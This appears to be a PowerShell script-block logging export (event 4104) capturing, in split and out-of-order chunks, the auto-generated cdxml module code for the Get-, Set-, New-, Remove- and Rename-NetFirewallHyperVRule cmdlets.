    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetFirewallHyperVRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RulePriority') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RulePriority})
        $__cmdletization_queryBuilder.FilterByProperty('RulePriority', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Direction') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Direction})
        $__cmdletization_queryBuilder.FilterByProperty('Direction', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('VMCreatorId') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${VMCreatorId})
        $__cmdletization_queryBuilder.FilterByProperty('VMCreatorId', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Protocol') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Protocol})
        $__cmdletization_queryBuilder.FilterByProperty('Protocol', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Action') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Action})
        $__cmdletization_queryBuilder.FilterByProperty('Action', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EnforcementStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EnforcementStatus})
        $__cmdletization_queryBuilder.FilterByProperty('EnforcementStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallHyperVRule.cmdletDefinitIon.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-NetFirewallHyperVRule' -Alias '*'
        

function Rename-NetFirewallHyperVRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallHyperVRule'

ScriptBlock ID: 09608154-cddc-467f-b671-dde3ed1657ff
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (2 of 5):
letization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallHyperVRule.cmdletDefinitIon.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'New-NetFirewallHyperVRule' -Alias '*'
        

function Get-NetFirewallHyperVRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallHyperVRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint16[]]
    ${RulePriority},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction[]]
    ${Direction},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${VMCreatorId},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Protocol},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action[]]
    ${Action},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.HyperVRuleStatus[]]
    ${EnforcementStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RulePriority') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RulePriority})
        $__cmdletization_queryBuilder.FilterByProperty('RulePriority', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Direction') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Direction})
        $__cmdletization_queryBuilder.FilterByProperty('Direction', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('VMCreatorId') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${VMCreatorId})
        $__cmdletization_queryBuilder.FilterByProperty('VMCreatorId', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Protocol') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Protocol})
        $__cmdletization_queryBuilder.FilterByProperty('Protocol', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Action') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Action})
        $__cmdletization_queryBuilder.FilterByProperty('Action', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EnforcementStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EnforcementStatus})
        $__cmdletization_queryBuilder.FilterByProperty('EnforcementStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallHyperVRule.cmdletDefinitIon.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetFirewallHyperVRule' -Alias '*'
        

function Set-NetFirewallHyperVRule
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallHyperVRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetFirewallHyperVRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewDisplayName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint16]
    ${RulePriority},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction]
    ${Direction},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${VMCreatorId},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Protocol},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${LocalAddresses},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${LocalPorts},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${RemoteAddresses},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${RemotePorts},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action]
    ${Action},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled]
    ${Enabled},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile]
    ${Profiles},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [ciminstance[]]
    ${PortStatuses},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewDisplayName')) {
            [object]$__cmdletization_value = ${NewDisplayName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RulePriority')) {
            [object]$__cmdletization_value = ${RulePriority}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RulePriority'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RulePriority'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Direction')) {
            [object]$__cmdletization_value = ${Direction}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Direction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Direction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('VMCreatorId')) {
            [object]$__cmdletization_value = ${VMCreatorId}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'VMCreatorId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'VMCreatorId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Protocol')) {
            [object]$__cmdletization_value = ${Protocol}
            $__cmdletization_me

ScriptBlock ID: 09608154-cddc-467f-b671-dde3ed1657ff
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 5):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetFirewallHyperVRule'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function New-NetFirewallHyperVRule
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('ID')]
    [string]
    ${Name},

    [Parameter(ParameterSetName='cim:CreateInstance0', Mandatory=$true)]
    [string]
    ${DisplayName},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint16]
    ${RulePriority},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction]
    ${Direction},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${VMCreatorId},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Protocol},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${LocalAddresses},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${LocalPorts},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${RemoteAddresses},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${RemotePorts},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action]
    ${Action},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled]
    ${Enabled},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile]
    ${Profiles},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [ciminstance[]]
    ${PortStatuses},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
